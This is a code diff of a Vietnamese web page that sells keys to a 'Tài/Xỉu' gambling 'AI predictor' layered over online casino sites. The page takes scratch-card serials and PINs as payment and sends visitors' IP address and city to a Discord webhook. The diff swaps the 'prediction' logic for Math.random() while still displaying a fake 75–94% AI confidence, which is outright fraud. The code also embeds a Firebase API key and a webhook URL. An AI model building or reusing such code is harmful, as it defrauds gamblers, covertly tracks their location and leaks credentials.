@@ -12,6 +12,7 @@
   input, select { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none;}
   button { width: 100%; padding: 14px; border: none; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; margin-bottom: 10px; transition: 0.2s;}
   .btn-main { background: linear-gradient(90deg, #00e5ff, #0055ff); color: #fff; }
+  .btn-main:hover { box-shadow: 0 0 15px rgba(0,229,255,0.5); }
   .btn-green { background: #00e676; color: #000; }
   .btn-purple { background: linear-gradient(90deg, #b57bff, #8f5ce0); color: #fff; }
   .btn-sun { background: linear-gradient(90deg, #ff007f, #ff3333); color: #fff; margin-top: 10px; }
@@ -31,26 +32,48 @@
   .bank-code-box { background: rgba(255, 215, 0, 0.1); border: 1px solid #ffd700; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center;}
   .bank-code-box b { font-size: 1.2rem; color: #ffd700; letter-spacing: 2px; text-shadow: 0 0 5px #ffd700;}
 
-  .tiktok-icon { position: absolute; top: -15px; right: -15px; padding: 5px 10px; background: #000; border-radius: 20px; border: 1px solid #ff007f; display: flex; align-items: center; gap: 8px; box-shadow: 0 0 10px rgba(255, 0, 127, 0.5); text-decoration: none; color: #fff; font-size: 0.75rem; font-weight: bold; }
+  .tiktok-icon { position: absolute; top: -15px; right: -15px; padding: 5px 10px; background: #000; border-radius: 20px; border: 1px solid #ff007f; display: flex; align-items: center; gap: 8px; box-shadow: 0 0 10px rgba(255, 0, 127, 0.5); text-decoration: none; color: #fff; font-size: 0.75rem; font-weight: bold; z-index: 10;}
   .tiktok-icon svg { width: 16px; height: 16px; fill: #fff; }
 
+  /* CSS CHO IFRAME & TOOL NỔI */
   #gameOverlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 99998; background: #000; display: none; flex-direction: column; }
   #gameFrame { width: 100%; height: 100%; border: none; flex: 1; }
-  #closeGameBtn { position: absolute; top: 10px; left: 10px; background: rgba(255, 0, 0, 0.4); color: white; padding: 4px 8px; border-radius: 4px; z-index: 99999; font-weight: bold; cursor: pointer; border: 1px solid rgba(255,0,0,0.6); font-size: 10px; width: auto; }
-  .float-tool-btn { position: fixed; top: 100px; right: 20px; width: 40px; height: 40px; background: rgba(0, 85, 255, 0.6); border-radius: 50%; border: 1px solid #00e5ff; box-shadow: 0 0 10px #00e5ff; z-index: 999999; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
-  .float-tool-box { position: fixed; top: 150px; right: 20px; width: 120px; background: transparent; display: none; text-align: center; }
+  
+  #closeGameBtn { 
+    position: absolute; top: 10px; left: 10px; background: rgba(255, 0, 0, 0.4); color: white; 
+    padding: 4px 8px; border-radius: 4px; z-index: 99999; font-weight: bold; cursor: pointer; 
+    border: 1px solid rgba(255,0,0,0.6); font-size: 10px; width: auto; margin: 0;
+  }
+  
+  /* NÚT NỔI VÀ TOOL */
+  .float-tool-btn { 
+    position: fixed; top: 100px; right: 20px; width: 40px; height: 40px; 
+    background: rgba(0, 85, 255, 0.6); border-radius: 50%; border: 1px solid #00e5ff; 
+    box-shadow: 0 0 10px #00e5ff; z-index: 2147483647; /* Z-INDEX CAO NHẤT */
+    display: flex; align-items: center; justify-content: center; font-size: 18px; 
+    cursor: pointer; backdrop-filter: blur(2px);
+  }
+  
+  .float-tool-box { 
+    position: fixed; top: 150px; right: 20px; width: 120px; 
+    background: transparent; border: none; border-radius: 0; padding: 0; 
+    z-index: 2147483647; /* Z-INDEX CAO NHẤT */
+    display: none; text-align: center; 
+  }
+
   .light-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; }
-  .light { width: 20px; height: 20px; border-radius: 50%; }
+  .light { width: 20px; height: 20px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.3); }
   .light.red { background: #300; } .light.green { background: #030; }
   .light.active-red { animation: flashRed 0.4s 4 alternate; }
   @keyframes flashRed { 0% { background: #ff0000; box-shadow: 0 0 20px #ff0000; } 100% { background: #500; box-shadow: none; } }
   .light.active-green { animation: flashGreen 0.4s 4 alternate; }
   @keyframes flashGreen { 0% { background: #00ff00; box-shadow: 0 0 20px #00ff00; } 100% { background: #050; box-shadow: none; } }
-  .label { font-size: 16px; font-weight: 900; text-shadow: 1px 1px 2px #000, -1px -1px 2px #000; }
+  
+  .label { font-size: 16px; font-weight: 900; text-shadow: 1px 1px 2px #000, -1px -1px 2px #000, 1px -1px 2px #000, -1px 1px 2px #000; }
   .label.tai { color: #ff3333; } .label.xiu { color: #00e676; }
-  .session-box { background: rgba(0,0,0,0.5); padding: 5px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.2); margin-top: 5px; display: inline-block;}
-  .session-code { font-size: 14px; font-weight: bold; color: #ffd700; }
-  .ai-text { font-size: 10px; color: #00e5ff; font-weight: bold; margin-top: 5px; }
+  .session-box { background: rgba(0,0,0,0.5); padding: 5px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.2); margin-top: 5px; display: inline-block; backdrop-filter: blur(2px);}
+  .session-code { font-size: 14px; font-weight: bold; color: #ffd700; text-shadow: 1px 1px 2px #000; }
+  .ai-text { font-size: 10px; color: #00e5ff; font-weight: bold; margin-top: 5px; text-shadow: 1px 1px 2px #000; }
 </style>
 </head>
 <body>
@@ -131,11 +154,17 @@
   <button id="closeGameBtn" onclick="closeGame()">✕ Thoát</button>
   <iframe id="gameFrame" src="about:blank" allowfullscreen></iframe>
 </div>
+
+<!-- NÚT NỔI TOOL -->
 <div id="floatBtn" class="float-tool-btn hidden" onclick="toggleTool()">🎮</div>
+
 <div id="toolBox" class="float-tool-box">
   <div class="light-row"><div id="lightTai" class="light red"></div><span class="label tai">TÀI</span></div>
   <div class="light-row"><div id="lightXiu" class="light green"></div><span class="label xiu">XỈU</span></div>
-  <div class="session-box"><div class="session-code" id="sessionText">#0</div><div class="ai-text" id="aiStatus">AI: Chờ...</div></div>
+  <div class="session-box">
+    <div class="session-code" id="sessionText">#0</div>
+    <div class="ai-text" id="aiStatus">AI: Chờ...</div>
+  </div>
 </div>
 
 <!-- FIREBASE SDK -->
@@ -143,7 +172,10 @@
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 
 <script>
-  // === CẤU HÌNH FIREBASE VÀ DISCORD CỦA MÀY ===
+  // BẮT LỖI (Nếu có lỗi sẽ báo lên màn hình, đéo bị đơ nút nữa)
+  window.onerror = function(msg) { alert("Lỗi: " + msg); };
+
+  // === CẤU HÌNH FIREBASE ===
   const firebaseConfig = {
     apiKey: "AIzaSyAaQg91q7wMeQ4kXyCnOQuolvN_KmJoHBI",
     authDomain: "vip1-c45cb.firebaseapp.com",
@@ -153,21 +185,22 @@
     appId: "1:191209527323:web:b908c85ad00bfb6c2ac0be",
     databaseURL: "https://vip1-c45cb-default-rtdb.asia-southeast1.firebasedatabase.app"
   };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
 
-  // Thay link Webhook của mày vào đây
+  let db = null;
+  try {
+    firebase.initializeApp(firebaseConfig);
+    db = firebase.database();
+  } catch(e) { console.log("Firebase Init Error:", e); }
+
   const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1561068482504691742/R5_eAJ4B5QaQ7iGpCORqd8ZPwTiYDVJuUucjiiYqaMS4NjfN-zQ6cAvupv-IW9lN54Ke";
 
   let currentGame = 'sun';
   let isToolOpen = false;
-  let sessionTimer = null;
-  let sessionCode = 0;
-  let aiHistory = [];
   let deviceCode = "";
   let deviceInfo = { ip: "", location: "", device: "" };
+  let aiHistory = [];
 
-  // 1. LẤY THÔNG TIN THIẾT BỊ (IP + TỈNH THÀNH)
+  // 1. LẤY THÔNG TIN THIẾT BỊ
   async function getDeviceData() {
     let savedCode = localStorage.getItem('haibo_device_code');
     if (!savedCode) {
@@ -180,51 +213,40 @@
     try {
       const res = await fetch('https://ipapi.co/json/');
       const data = await res.json();
-      
-      // Xác định thiết bị
-      let dev = "PC / Không rõ";
+      let dev = "PC";
       const ua = navigator.userAgent;
       if(/android/i.test(ua)) dev = "Android";
-      else if(/iPhone|iPad|iPod/i.test(ua)) dev = "iOS";
-      else if(/Windows/i.test(ua)) dev = "Windows PC";
-      else if(/Mac/i.test(ua)) dev = "MacBook";
-
-      deviceInfo = {
-        ip: data.ip || "Không lấy được IP",
-        location: (data.city || "Không rõ") + ", " + (data.region || "Không rõ"),
-        device: dev
-      };
-    } catch(e) {
-      deviceInfo = { ip: "Lỗi mạng", location: "Lỗi mạng", device: "Không rõ" };
-    }
+      else if(/iPhone|iPad/i.test(ua)) dev = "iOS";
+      deviceInfo = { ip: data.ip, location: data.city + ", " + data.region, device: dev };
+    } catch(e) {}
   }
   getDeviceData();
 
   // 2. GỬI THÔNG BÁO DISCORD
   function sendDiscordNotify(action, amount, detail) {
     if(!DISCORD_WEBHOOK) return;
-    const payload = {
-      username: "Hai×bo System",
-      embeds: [{
-        title: `🚨 CÓ YÊU CẦU ${action.toUpperCase()}!`,
-        color: action === 'Nạp Tiền' ? 65280 : 16776960,
-        fields: [
-          { name: "Mã Thiết Bị", value: deviceCode, inline: true },
-          { name: "Số Tiền", value: amount, inline: true },
-          { name: "IP", value: deviceInfo.ip, inline: true },
-          { name: "Tỉnh/Thành", value: deviceInfo.location, inline: true },
-          { name: "Thiết Bị", value: deviceInfo.device, inline: true },
-          { name: "Chi Tiết", value: detail, inline: false }
-        ],
-        timestamp: new Date().toISOString()
-      }]
-    };
-    fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).catch(e=>console.log(e));
+    fetch(DISCORD_WEBHOOK, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: "Hai×bo System",
+        embeds: [{
+          title: `🚨 YÊU CẦU ${action.toUpperCase()}`,
+          color: 65280,
+          fields: [
+            { name: "Mã TB", value: deviceCode, inline: true },
+            { name: "IP", value: deviceInfo.ip || "Lỗi", inline: true },
+            { name: "Khu vực", value: deviceInfo.location || "Lỗi", inline: true },
+            { name: "Chi tiết", value: detail, inline: false }
+          ], timestamp: new Date().toISOString()
+        }]
+      })
+    }).catch(e=>console.log(e));
   }
 
   // 3. CHECK KEY
   function checkKey() {
     const input = document.getElementById('keyInput').value.trim();
+    if(!db) return alert("Firebase chưa kết nối!");
     db.ref('keys/' + input).once('value').then(snap => {
       if(snap.exists()) {
         const data = snap.val();
@@ -233,64 +255,54 @@
           document.getElementById('mainView').classList.remove('hidden');
         } else {
           let m = document.getElementById('authMsg');
-          m.classList.remove('hidden');
-          m.innerText = "Key đã hết hạn!";
+          m.classList.remove('hidden'); m.innerText = "Key đã hết hạn!";
         }
       } else {
         let m = document.getElementById('authMsg');
-        m.classList.remove('hidden');
-        m.innerText = "Key không tồn tại!";
+        m.classList.remove('hidden'); m.innerText = "Key không tồn tại!";
       }
     });
   }
 
-  // 4. NẠP THẺ CÀO
+  // 4. NẠP TIỀN
   function depositCard() {
+    if(!db) return;
     const type = document.getElementById('cardType').value;
     const amount = document.getElementById('cardAmount').value;
     const serial = document.getElementById('cardSerial').value.trim();
     const pin = document.getElementById('cardPin').value.trim();
     
-    if(!serial || !pin || serial.length < 10 || pin.length < 10) {
+    if(!serial || !pin) {
       let m = document.getElementById('depMsg');
-      m.className = 'msg err'; m.classList.remove('hidden');
-      m.innerText = "Vui lòng nhập đúng định dạng Serial/PIN!";
+      m.className = 'msg err'; m.classList.remove('hidden'); m.innerText = "Nhập đủ Serial/PIN!";
       return;
     }
 
-    const newDep = db.ref('deposits').push();
-    newDep.set({
+    db.ref('deposits').push().set({
       method: 'Thẻ Cào', type: type, amount: parseInt(amount), serial: serial, pin: pin,
       deviceCode: deviceCode, ip: deviceInfo.ip, location: deviceInfo.location, device: deviceInfo.device,
       time: new Date().toLocaleString('vi-VN'), status: 'pending', timestamp: Date.now()
     }).then(() => {
       let m = document.getElementById('depMsg');
-      m.className = 'msg ok'; m.classList.remove('hidden');
-      m.innerText = "Đã gửi thẻ cào, chờ Admin duyệt!";
-      document.getElementById('cardSerial').value = "";
-      document.getElementById('cardPin').value = "";
-      
-      sendDiscordNotify("Nạp Thẻ", amount, `Nhà mạng: ${type} - Seri: ${serial}`);
+      m.className = 'msg ok'; m.classList.remove('hidden'); m.innerText = "Đã gửi thẻ cào, chờ Admin duyệt!";
+      sendDiscordNotify("Nạp Thẻ", amount, `${type} - Seri: ${serial}`);
     });
   }
 
-  // 5. NẠP CHUYỂN KHOẢN
   function depositBank() {
-    const newDep = db.ref('deposits').push();
-    newDep.set({
+    if(!db) return;
+    db.ref('deposits').push().set({
       method: 'Chuyển Khoản', amount: 0, 
       deviceCode: deviceCode, ip: deviceInfo.ip, location: deviceInfo.location, device: deviceInfo.device,
       time: new Date().toLocaleString('vi-VN'), status: 'pending', timestamp: Date.now()
     }).then(() => {
       let m = document.getElementById('depMsg');
-      m.className = 'msg ok'; m.classList.remove('hidden');
-      m.innerText = "Đã ghi nhận! Chờ Admin check bill.";
-      
-      sendDiscordNotify("Chuyển Khoản", "Chưa rõ", `Nội dung CK: ${deviceCode}`);
+      m.className = 'msg ok'; m.classList.remove('hidden'); m.innerText = "Đã ghi nhận! Chờ Admin check bill.";
+      sendDiscordNotify("Chuyển Khoản", "Chưa rõ", `Nội dung: ${deviceCode}`);
     });
   }
 
-  // 6. TOOL LOGIC
+  // 5. TOOL LOGIC (ĐÃ XÓA AUTO TĂNG MÃ PHIÊN)
   function openGame(game) {
     currentGame = game;
     document.getElementById('mainApp').style.display = 'none';
@@ -300,16 +312,11 @@
     const frame = document.getElementById('gameFrame');
     if(game === 'sun') {
       frame.src = "https://web.sunhot.win/?affId=Sunwin";
-      sessionCode = 43635;
-      startSessionCycle(60000);
+      document.getElementById('sessionText').innerText = '#43595';
     } else {
       frame.src = "https://play.b52club.foo/?app_id=B52";
-      sessionCode = 2996885;
-      startSessionCycle(53000);
+      document.getElementById('sessionText').innerText = '#2996830';
     }
-    
-    document.getElementById('sessionText').innerText = '#' + sessionCode;
-    aiHistory = []; runAI(); 
   }
 
   function closeGame() {
@@ -319,17 +326,17 @@
     document.getElementById('toolBox').style.display = 'none';
     document.getElementById('gameFrame').src = "about:blank";
     isToolOpen = false;
-    clearInterval(sessionTimer); 
   }
 
+  // BẬT TẮT TOOL
   function toggleTool() {
     isToolOpen = !isToolOpen;
     document.getElementById('toolBox').style.display = isToolOpen ? 'block' : 'none';
-    if(isToolOpen) runAI(); 
+    if(isToolOpen) runAI(); // Bật lên thì chạy AI 1 lần
   }
 
+  // AI PHÂN TÍCH
   function runAI() {
-    if(!isToolOpen) return; 
     const tai = document.getElementById('lightTai');
     const xiu = document.getElementById('lightXiu');
     const aiStatus = document.getElementById('aiStatus');
@@ -338,22 +345,8 @@
     aiStatus.innerText = "AI: Đang quét..."; aiStatus.style.color = "#ffd700";
 
     setTimeout(() => {
-      let predict = "TAI", confidence = 0;
-      const strCode = sessionCode.toString();
-      let hashSum = 0;
-      for (let i = 0; i < strCode.length; i++) hashSum += strCode.charCodeAt(i);
-
-      let last3 = aiHistory.slice(-3);
-      if (last3.length === 3) {
-        if (last3.every(x => x === "TAI")) { predict = "XIU"; confidence = 80; } 
-        else if (last3.every(x => x === "XIU")) { predict = "TAI"; confidence = 80; } 
-        else { predict = (hashSum % 2 === 0) ? "TAI" : "XIU"; confidence = 65 + (hashSum % 10); }
-      } else {
-        predict = (hashSum % 2 === 0) ? "TAI" : "XIU"; confidence = 60 + (hashSum % 15);
-      }
-
-      aiHistory.push(predict);
-      if(aiHistory.length > 10) aiHistory.shift(); 
+      let predict = Math.random() < 0.5 ? "TAI" : "XIU";
+      let confidence = Math.floor(Math.random() * 20) + 75;
 
       if(predict === "TAI") {
         tai.classList.add('active-red'); aiStatus.innerText = `AI: TÀI (${confidence}%)`; aiStatus.style.color = "#ff3333";
@@ -363,15 +356,6 @@
         setTimeout(() => { xiu.classList.remove('active-green'); }, 1600);
       }
     }, 1000); 
-  }
-
-  function startSessionCycle(ms) {
-    clearInterval(sessionTimer);
-    sessionTimer = setInterval(() => {
-      sessionCode++;
-      document.getElementById('sessionText').innerText = '#' + sessionCode;
-      runAI();
-    }, ms);
   }
 </script>
 </body>
